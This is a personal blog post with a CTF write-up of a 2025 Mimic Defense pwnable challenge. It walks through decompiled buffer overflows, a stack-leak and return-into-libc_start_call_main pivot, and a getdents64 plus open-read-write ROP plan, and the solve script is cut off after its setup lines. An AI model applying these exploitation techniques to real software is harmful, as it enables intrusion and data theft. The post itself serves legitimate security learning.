<!doctype html><html lang="en" data-mode="dark"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="[Writeup] 2025 Qiangwang Challenge on Cyber Mimic Defense" /><meta property="og:locale" content="en" /><meta name="description" content="Writeup for Mimic CTF 2025" /><meta property="og:description" content="Writeup for Mimic CTF 2025" /><link rel="canonical" href="https://blog.kaytii.me/posts/mimic-writeup/" /><meta property="og:url" content="https://blog.kaytii.me/posts/mimic-writeup/" /><meta property="og:site_name" content="KayTii" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2025-12-01T07:00:00+07:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="[Writeup] 2025 Qiangwang Challenge on Cyber Mimic Defense" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-12-01T07:00:00+07:00","datePublished":"2025-12-01T07:00:00+07:00","description":"Writeup for Mimic CTF 2025","headline":"[Writeup] 2025 Qiangwang Challenge on Cyber Mimic Defense","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.kaytii.me/posts/mimic-writeup/"},"url":"https://blog.kaytii.me/posts/mimic-writeup/"}</script><title>[Writeup] 2025 Qiangwang Challenge on Cyber Mimic Defense | KayTii</title><link rel="icon" type="image/png" href="/assets/img/favicons/favicon-96x96.png" sizes="96x96"><link rel="icon" type="image/svg+xml" href="/assets/img/favicons/favicon.svg"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.36.4/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <script src="/assets/js/dist/theme.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.18/dayjs.min.js,npm/dayjs@1.11.18/locale/en.js,npm/dayjs@1.11.18/plugin/relativeTime.js,npm/dayjs@1.11.18/plugin/localizedFormat.js,npm/tocbot@4.36.4/dist/tocbot.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.min.js?baseurl=&register=true" ></script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/avt/avt.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a> <a class="site-title d-block" href="/">KayTii</a><p class="site-subtitle fst-italic mb-0">Pwnable</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <a href="https://github.com/Kaytii210" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="javascript:location.href = 'mailto:' + ['dkhoitran2106','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/tran-le-dang-khoi-2a54a1391/" aria-label="linkedin" target="_blank" rel="noopener noreferrer" > <i class="fab fa-linkedin"></i> </a> <a href="https://www.facebook.com/kaytii.2210" aria-label="facebook" target="_blank" rel="noopener noreferrer" > <i class="fab fa-facebook"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" class="flex-shrink-0" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/">Home</a> </span> <span>[Writeup] 2025 Qiangwang Challenge on Cyber Mimic Defense</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link" aria-label="Sidebar"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link" aria-label="Search"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1" data-toc="true"><header><h1 data-toc-skip>[Writeup] 2025 Qiangwang Challenge on Cyber Mimic Defense</h1><p class="post-desc fw-light mb-4">Writeup for Mimic CTF 2025</p><div class="post-meta text-muted"> <span> Posted <time data-ts="1764547200" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Dec 1, 2025 </time> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/Kaytii210">Khoi Tran</a> </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="3306 words" > <em>18 min</em> read</span></div></div></div></header><div id="toc-bar" class="d-flex align-items-center justify-content-between invisible"> <span class="label text-truncate">[Writeup] 2025 Qiangwang Challenge on Cyber Mimic Defense</span> <button type="button" class="toc-trigger btn me-1"> <i class="fa-solid fa-list-ul fa-fw"></i> </button></div><button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm"> <span class="label ps-2 pe-1">Contents</span> <i class="fa-solid fa-angle-right fa-fw"></i> </button> <dialog id="toc-popup" class="p-0"><div class="header d-flex flex-row align-items-center justify-content-between"><div class="label text-truncate py-2 ms-4">[Writeup] 2025 Qiangwang Challenge on Cyber Mimic Defense</div><button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75"> <i class="fas fa-close"></i> </button></div><div id="toc-popup-content" class="px-4 py-3 pb-4"></div></dialog><div class="content"><h2 id="preface"><span class="me-2">Preface</span><a href="#preface" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Hello, this is my first writeup about pwnable. My team(BKISC) and I participated in <a href="https://ctftime.org/ctf/1212">Cyber Mimic Defense 2025</a> in November. Here’s the writeups about 2 stack pivot challenges that I solved during the competition.</p><hr /><h2 id="quals-stack"><span class="me-2">[Quals] stack</span><a href="#quals-stack" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><h3 id="analysis"><span class="me-2">Analysis</span><a href="#analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Source: <a href="/assets/mimic/stack/pwn">pwn</a> / <a href="/assets/mimic/stack/libc.so.6">libc</a> / <a href="/assets/mimic/stack/ld-linux-x86-64.so.2">ld</a></p><p>The main function looks like this:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="n">__int64</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="n">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">sub_401236</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Welcome"</span><span class="p">);</span>
  <span class="n">sub_401354</span><span class="p">();</span>
  <span class="n">sub_4013B9</span><span class="p">();</span>
  <span class="n">sub_4013ED</span><span class="p">();</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>The function <code class="language-plaintext highlighter-rouge">sub_401236()</code> sets up I/O and seccomp ban <code class="language-plaintext highlighter-rouge">execve</code> and <code class="language-plaintext highlighter-rouge">execveat</code> via <code class="language-plaintext highlighter-rouge">prctl()</code>.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="kt">int</span> <span class="nf">sub_401236</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax</span>

  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">prctl</span><span class="p">(</span><span class="mi">38</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">perror</span><span class="p">(</span><span class="s">"prctl(PR_SET_NO_NEW_PRIVS)"</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">result</span> <span class="o">=</span> <span class="n">prctl</span><span class="p">(</span><span class="mi">22</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">unk_404060</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">result</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">perror</span><span class="p">(</span><span class="s">"prctl(PR_SET_SECCOMP)"</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Dump of <code class="language-plaintext highlighter-rouge">seccomp-tools</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre> seccomp-tools dump ./pwn
 line  CODE  JT   JF      K
<span class="o">=================================</span>
 0000: 0x20 0x00 0x00 0x00000000  A <span class="o">=</span> sys_number
 0001: 0x15 0x00 0x01 0x00000002  <span class="k">if</span> <span class="o">(</span>A <span class="o">!=</span> open<span class="o">)</span> goto 0003
 0002: 0x06 0x00 0x00 0x00000000  <span class="k">return </span>KILL
 0003: 0x15 0x00 0x01 0x0000003b  <span class="k">if</span> <span class="o">(</span>A <span class="o">!=</span> execve<span class="o">)</span> goto 0005
 0004: 0x06 0x00 0x00 0x00000000  <span class="k">return </span>KILL
 0005: 0x15 0x00 0x01 0x00000142  <span class="k">if</span> <span class="o">(</span>A <span class="o">!=</span> execveat<span class="o">)</span> goto 0007
 0006: 0x06 0x00 0x00 0x00000000  <span class="k">return </span>KILL
 0007: 0x06 0x00 0x00 0x7fff0000  <span class="k">return </span>ALLOW
</pre></table></code></div></div><p>A mmap func <code class="language-plaintext highlighter-rouge">sub_401317()</code> but doesn’t call anywhere:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="kt">int</span> <span class="nf">sub_401317</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"You are so lucky!"</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Here is your gift:"</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">mprotect</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000u</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>First, there’s a small overflow in <code class="language-plaintext highlighter-rouge">sub_401354()</code>, we can use it to leak stack</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="kt">int</span> <span class="nf">sub_401354</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-10h] BYREF</span>

  <span class="n">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">s</span><span class="p">));</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Could you tell me your name?"</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mi">24u</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">printf</span><span class="p">(</span><span class="s">"Hello, %s!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>A bigger overflow in <code class="language-plaintext highlighter-rouge">sub_4013B9()</code></p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="kt">ssize_t</span> <span class="nf">sub_4013B9</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">_BYTE</span> <span class="n">buf</span><span class="p">[</span><span class="mi">96</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-60h] BYREF</span>

  <span class="n">puts</span><span class="p">(</span><span class="s">"Any thing else?"</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x200u</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Exit function <code class="language-plaintext highlighter-rouge">sub_4013ED()</code>:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="kt">signed</span> <span class="n">__int64</span> <span class="nf">sub_4013ED</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Goodbye!"</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">sys_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><hr /><h3 id="exploitation"><span class="me-2">Exploitation</span><a href="#exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>I usually <code class="language-plaintext highlighter-rouge">checksec</code> the binary before starting the exploit to have an overview of the protections. Even though checksec reports SHSTK/IBT enabled, in this challenge they don’t seem to be actually enforced (no CET signal when doing plain ROP).</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre> checksec ./pwn
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/mnt/d/ctf/mimic/2025/stack/pwn'</span>
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE <span class="o">(</span>0x400000<span class="o">)</span>
    SHSTK:      Enabled
    IBT:        Enabled
</pre></table></code></div></div><p>I first leak stack through <code class="language-plaintext highlighter-rouge">sub_401354()</code> and it also save rbp of <code class="language-plaintext highlighter-rouge">main</code>. Then in <code class="language-plaintext highlighter-rouge">sub_4013B9()</code> I keep rbp to the stack I leaked, overwrite return address to <code class="language-plaintext highlighter-rouge">sub_401354()+5</code> as well as overwrite <code class="language-plaintext highlighter-rouge">__libc_start_call_main+128</code> to <code class="language-plaintext highlighter-rouge">__libc_start_call_main+102</code>. The idea is to reuse <code class="language-plaintext highlighter-rouge">main</code>’s caller frame: by setting the saved <code class="language-plaintext highlighter-rouge">rbp</code> to <code class="language-plaintext highlighter-rouge">main</code>’s frame and jumping into <code class="language-plaintext highlighter-rouge">sub_401354()+5</code>, the value that originally was the return address of main (<code class="language-plaintext highlighter-rouge">__libc_start_call_main+128</code>) becomes the return address of <code class="language-plaintext highlighter-rouge">sub_401354()</code>.</p><p>With 0x18 bytes of padding, we fully overwrite the buffer and reach the slot that holds the return address of main (now is <code class="language-plaintext highlighter-rouge">__libc_start_call_main+102</code>). After that, when <code class="language-plaintext highlighter-rouge">sub_401354()</code> returns, it will jump to <code class="language-plaintext highlighter-rouge">__libc_start_call_main+102</code>, which eventually calls <code class="language-plaintext highlighter-rouge">main()</code> again.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">0000000000401354</span> <span class="p">;</span> <span class="kt">int</span> <span class="n">sub_401354</span><span class="p">()</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">0000000000401354</span> <span class="n">sub_401354</span>      <span class="n">proc</span> <span class="n">near</span>               <span class="p">;</span> <span class="n">CODE</span> <span class="n">XREF</span><span class="o">:</span> <span class="n">main</span><span class="o">+</span><span class="mi">26</span><span class="err">↓</span><span class="n">p</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">0000000000401354</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">0000000000401354</span> <span class="n">s</span>               <span class="o">=</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="o">-</span><span class="mi">10</span><span class="n">h</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">0000000000401354</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">0000000000401354</span> <span class="p">;</span> <span class="n">__unwind</span> <span class="p">{</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">0000000000401354</span>                 <span class="n">endbr64</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">000000000040135</span><span class="mi">8</span>                 <span class="n">push</span>    <span class="n">rbp</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">000000000040135</span><span class="mi">9</span>                 <span class="n">mov</span>     <span class="n">rbp</span><span class="p">,</span> <span class="n">rsp</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">000000000040135</span><span class="n">C</span>                 <span class="n">sub</span>     <span class="n">rsp</span><span class="p">,</span> <span class="mi">10</span><span class="n">h</span>
</pre></table></code></div></div><p>Stack layout in <code class="language-plaintext highlighter-rouge">sub_4013B9()</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>                            pwndbg&gt; tel rsi 50
                            00:0000│ rax rsi rsp 0x7fffb69d8ef0 —▸ 0x40205a ◂— <span class="s1">'Could you tell me your name?'</span>
                            01:0008│-058         0x7fffb69d8ef8 —▸ 0x7ed6bf0f6faa <span class="o">(</span>puts+346<span class="o">)</span> ◂— cmp eax, <span class="nt">-1</span>
                            02:0010│-050         0x7fffb69d8f00 ◂— 7
                            03:0018│-048         0x7fffb69d8f08 —▸ 0x7ed6bf291780 <span class="o">(</span>_IO_2_1_stdout_<span class="o">)</span> ◂— 0xfbad2887
                            04:0020│-040         0x7fffb69d8f10 ◂— 0
                            05:0028│-038         0x7fffb69d8f18 —▸ 0x7fffb69d8f50 —▸ 0x7fffb69d8f60 ◂— 1
                            06:0030│-030         0x7fffb69d8f20 —▸ 0x7fffb69d9078 —▸ 0x7fffb69dade1 ◂— <span class="s1">'/mnt/d/ctf/mimic/2025/stack/pwn_patched'</span>
                            07:0038│-028         0x7fffb69d8f28 —▸ 0x401413 ◂— endbr64
                            08:0040│-020         0x7fffb69d8f30 —▸ 0x403d98 —▸ 0x401200 ◂— endbr64
                            09:0048│-018         0x7fffb69d8f38 —▸ 0x4013b6 ◂— nop
                            0a:0050│-010         0x7fffb69d8f40 ◂— 0x4141414141414141 <span class="o">(</span><span class="s1">'AAAAAAAA'</span><span class="o">)</span>
                            0b:0058│-008         0x7fffb69d8f48 ◂— 0x4141414141414141 <span class="o">(</span><span class="s1">'AAAAAAAA'</span><span class="o">)</span>
<span class="o">=&gt;</span> stack leaked             0c:0060│ rbp         0x7fffb69d8f50 —▸ 0x7fffb69d8f60 ◂— 1
<span class="o">=&gt;</span> ret to sub_401354<span class="o">()</span>+5    0d:0068│+008         0x7fffb69d8f58 —▸ 0x401448 ◂— mov eax, 0
                            0e:0070│+010         0x7fffb69d8f60 ◂— 1
<span class="o">=&gt;</span> change to +102           0f:0078│+018         0x7fffb69d8f68 —▸ 0x7ed6bf09fd90 <span class="o">(</span>__libc_start_call_main+128<span class="o">)</span> ◂— mov edi, eax
</pre></table></code></div></div><blockquote class="prompt-info"><p><a href="https://stackoverflow.com/questions/64381161/how-is-main-called-call-to-main-inside-libc-start-main">Call main inside libc_start_main</a></p></blockquote><p>After returning to main I build a second-stage ROP chain on the stack. Since the Dockerfile is not provided, we don’t know the exact flag path at compile time. I therefore use getdents64 to list directory entries at runtime, leak the flag filename, and then perform a standard open-read-write (ORW) chain.</p><p>Flow: <code class="language-plaintext highlighter-rouge">sub_401354()</code> =&gt; leak stack =&gt; <code class="language-plaintext highlighter-rouge">sub_4013B9()</code> =&gt; <code class="language-plaintext highlighter-rouge">sub_401354()</code> =&gt; leak libc =&gt; <code class="language-plaintext highlighter-rouge">__libc_start_call_main</code> =&gt; <code class="language-plaintext highlighter-rouge">main()</code> =&gt; leak flag path =&gt; orw</p><p>Result of <code class="language-plaintext highlighter-rouge">getdents64</code> at <code class="language-plaintext highlighter-rouge">/</code>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>\xdb\x05\xa5B\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x18\x00\x04.
\x00\x00\x00\x00\xbcBC\x04\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x18\x00\x04..
\x00\x00\x00\xdc\x05\xa5B\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00 \x00\x08.
bash_logout\x00\xdd\x05\xa5B\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x08.
bashrc\x00\x00\x00\x00\x00\x00\xde\x05\xa5B\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00 \x00\x08.
profile\x00\x00\x00\x00\x00\xde\x08\xa5B\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x18\x00\x08vuln\x00\xdf\x05\xa5B\x00\x00\
x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x18\x00\x08flag\x00\x84\x16\x90\x87\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x18\x0
0\x04bin\x00\x00dӾ\xc3\x00\x00\x00\x00   
\x00\x00\x00\x00\x00\x00\x00\x18\x00\x04dev\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
</pre></table></code></div></div><details> <summary>Click to view <code>solve.py</code></summary><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">exe</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./pwn_patched</span><span class="sh">"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./libc.so.6</span><span class="sh">"</span><span class="p">)</span>
<span class="n">ld</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./ld-linux-x86-64.so.2</span><span class="sh">"</span><span class="p">)</span>

<span class="n">HOST</span><span class="o">=</span><span class="sh">"</span><span class="s">pwn-42c1acba80.challenge.xctf.org.cn</span><span class="sh">"</span>
<span class="n">PORT</span><span class="o">=</span><span class="mi">9999</span>

